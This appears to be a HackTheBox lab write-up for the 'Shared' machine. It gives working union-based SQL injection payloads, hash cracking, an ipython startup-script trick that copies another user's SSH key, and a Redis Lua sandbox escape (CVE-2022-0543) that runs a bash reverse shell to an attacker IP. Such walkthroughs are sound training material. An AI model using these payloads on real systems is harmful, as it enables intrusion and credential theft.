---
title: HTB | Shared
author: Zeropio
date: 2022-08-29
categories: [Pentesting, HackTheBox]
tags: [htb, linux, medium, machines]
permalink: /pentesting/htb/machines/shared
image:
  path: /assets/img/hackthebox/card/Shared.png
  width: 800
  height: 500
---

# Fingerprinting

We can know that the server only has a web server:

```
PORT    STATE SERVICE  VERSION
22/tcp  open  ssh      OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)
| ssh-hostkey: 
|   3072 91:e8:35:f4:69:5f:c2:e2:0e:27:46:e2:a6:b6:d8:65 (RSA)
|   256 cf:fc:c4:5d:84:fb:58:0b:be:2d:ad:35:40:9d:c3:51 (ECDSA)
|_  256 a3:38:6d:75:09:64:ed:70:cf:17:49:9a:dc:12:6d:11 (ED25519)
80/tcp  open  http     nginx 1.18.0
|_http-server-header: nginx/1.18.0
|_http-title: Did not follow redirect to http://shared.htb
443/tcp open  ssl/http nginx 1.18.0
| tls-nextprotoneg: 
|   h2
|_  http/1.1
|_ssl-date: TLS randomness does not represent time
|_http-server-header: nginx/1.18.0
| tls-alpn: 
|   h2
|_  http/1.1
|_http-title: Did not follow redirect to https://shared.htb
| ssl-cert: Subject: commonName=*.shared.htb/organizationName=HTB/stateOrProvinceName=None/countryName=US
| Not valid before: 2022-03-20T13:37:14
|_Not valid after:  2042-03-15T13:37:14
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

We can try navigating to **shared.htb** and see that is a store with a cart. Adding things to the cart and going to pay will redirect us to **checkout.shared.htb**. In that page we can see two strange cookies.

# Foothold

We can try some tools like sqlmap to try testing on it, without success:

```console
zero@pio$ sqlmap -r req --level=2 --cookie='PrestaShop-5f7b4f27831ed69a86c734aa3c67dd4c=def50200f709dbd7fa8dc3ee67a4c5b7d63d4171dd53915d28de292a88baee830cc319456886303b611bd1811fbf6bd46be2b6f287e4af10a7b9971c6418432b175b474f620008d4c033ec730e16f0247135eb6c87e9a7522ef50ff14bf3820ee0951237efeb26466e8b589bc52712001991422cba6a3214acd11bd313e5c7529a8d61a006b79a96952bc183034849ad445a7853728792606a4a0c7a5f3033c341767ca9e49f5edab0a265cd60792399520c15cc52260d65927084f3129919780e164d09108745db41d514bcea071862419cc0efb41b4330adeae10d07bc8f5ca3883e947347c9a19a5a0c3818d58eca1166164250a5dd25b2ef131562828e9a5e87ba02f906b61fe501d306bc02a402ee7ce682d7f24bf6a03aae; custom_cart=*' -p 'custom_cart' --batch
```

Manually we can try some common SQL injections. Trying different payloads, until `{"' and 0=1 union select 1,2,3-- -":"1"}` works. We can see that we can visualize the 1 and 2 colum. We can start with a SQL Union based.

Using the `@@version` as `{"' and 0=1 union select 1,@@version,3-- -":"1"}` show that the version is **10.5.15-MariaDB-0+deb11u1**.

We can get the database name with `{"' and 0=1 union select 1,database(),3-- -":"1"}` :

![Untitled](/assets/img/hackthebox/labs/shared/Untitled.png)

We can get the table name with `{"' and 0=1 union select 1,TABLE_NAME,3 from INFORMATION_SCHEMA.TABLES where table_schema='checkout'-- -":"1"}`:

![Untitled](/assets/img/hackthebox/labs/shared/Untitled%201.png)

We can try guessing some commons fields from a user database, like the name or the password with `{"' and 0=1 union select 1,username,2 from checkout.user-- -":"1"}`  and `{"' and 0=1 union select 1,password,2 from checkout.user-- -":"1"}`:

![Untitled](/assets/img/hackthebox/labs/shared/Untitled%202.png)

![Untitled](/assets/img/hackthebox/labs/shared/Untitled%203.png)

We can see some kind of md5 password. We can try breaking it with hashcat:

```console
zero@pio$ hashcat -m 0 hash /usr/share/wordlists/rockyou.txt

...
fc895d4eddc2fc12f995e18c865cf273:Soleil101                
                                                          
Session..........: hashcat
Status...........: Cracked
```

Let’s try using it to get an SSH connection:

```console
zero@pio$ ssh james_mason@10.10.11.172

...
james_mason@shared:~$
```

# Privilege Escalation

We can found that our user is part of a **developer** group:

```console
james_mason@shared:~$ id
	uid=1000(james_mason) gid=1000(james_mason) groups=1000(james_mason),1001(developer)
```

Let’s see what files does this user has:

```console
james_mason@shared:~$ find / -group developer 2>/dev/null
	/opt/scripts_review
james_mason@shared:~$ cd /opt/scripts_review
james_mason@shared:/opt/scripts_review$ ls
james_mason@shared:/opt/scripts_review$
```

We don’t have any files, but have write permissions. Using **pspy** we can see that the **UID 1001** is using ipython:

```console
2022/08/29 06:00:01 CMD: UID=1001 PID=29966  | /bin/sh -c /usr/bin/pkill ipython; cd /opt/scripts_review/ && /usr/local/bin/ipython 
2022/08/29 06:00:01 CMD: UID=1001 PID=29967  | /usr/bin/pkill ipython 
2022/08/29 06:00:01 CMD: UID=1001 PID=29968  | /bin/sh -c /usr/bin/pkill ipython; cd /opt/scripts_review/ && /usr/local/bin/ipython
```

We can search for vulnerabilities, finding this [Github post](https://github.com/ipython/ipython/security/advisories/GHSA-pq7m-3gw7-gq5x), that gives us a PoC. We can try to replicate it, but changing the command:

```console
james_mason@shared:/opt/scripts_review$ mkdir -m 777 profile_default
james_mason@shared:/opt/scripts_review$ mkdir -m 777 profile_default/startup
james_mason@shared:/opt/scripts_review$ echo "import os; os.system('cat ~/.ssh/id_rsa > /dev/shm/key')" > profile_default/startup/foo.py
```

We will get a RSA in the `/dev/shm/key` {: .filepath}. After using it, we will be **dan_smith**, not root yet.

Using the same steps we can see that this user is part of a **sysadmin** group:

```console
dan_smith@shared:~$ id
	uid=1001(dan_smith) gid=1002(dan_smith) groups=1002(dan_smith),1001(developer),1003(sysadmin)
dan_smith@shared:~$ find / -group sysadmin 2>/dev/null
	/usr/local/bin/redis_connector_dev
```

Executing redis we will get:

```console
dan_smith@shared:~$ /usr/local/bin/redis_connector_dev
	[+] Logging to redis instance using password...
	
	INFO command result:
	# Server
	redis_version:6.0.15
	redis_git_sha1:00000000
	redis_git_dirty:0
	redis_build_id:4610f4c3acf7fb25
	redis_mode:standalone
	os:Linux 5.10.0-16-amd64 x86_64
	arch_bits:64
	multiplexing_api:epoll
	atomicvar_api:atomic-builtin
	gcc_version:10.2.1
	process_id:29830
	run_id:fa1fe4f300db414bab5300041632304ba2486ee6
	tcp_port:6379
	uptime_in_seconds:1525
	uptime_in_days:0
	hz:10
	configured_hz:10
	lru_clock:823628
	executable:/usr/bin/redis-server
	config_file:/etc/redis/redis.conf
	io_threads_active:0
	 <nil>
```

We can see that redis is passing a password that we can’t see. Using `redis-cli` we can see the port is using:

```console
dan_smith@shared:~$ redis-cli
127.0.0.1:6379>
```

We can get the file in our machine and use netcat to see what we get:

```console
dan_smith@shared:/usr/local/bin$ python3 -m http.server 8000

```

```console
zero@pio$ wget http://10.10.11.172:8000/redis_connector_dev
zero@pio$ chmod +x redis_connector_dev
zero@pio$ nc -lvnp 6379
```

```console
zero@pio$ ./redis_connector_dev
```

In the netcat we will a cleartext password: `F2WHqJUz2WEz=Gqq` . Now we can exploit this [vulnerability](https://thesecmaster.com/how-to-fix-cve-2022-0543-a-critical-lua-sandbox-escape-vulnerability-in-redis/) with the password. Back in the target machine, execute `redis-cli` with the password:

```console
dan_smith@shared:/usr/local/bin$ redis-cli --pass "F2WHqJUz2WEz=Gqq"
```

With this vulnerability we can execute a reverse shell:

```console
**dan_smith@shared:~$ echo "bash -i >& /dev/tcp/10.10.16.44/443 0>&1" > shell**
```

And now execute the vulnerability:

```console
127.0.0.1:6379> eval 'local l = package.loadlib("/usr/lib/x86_64-linux-gnu/liblua5.1.so.0", "luaopen_io"); local io = l(); local f = io.popen("cat /home/dan_smith/shell | bash"); local res = f:read("*a"); f:close(); return res' 0
```

In a netcat in our machine should recieve the connection:

```console
zero@pio$ nc -lvnp 443

...
root@shared:/tmp#
```
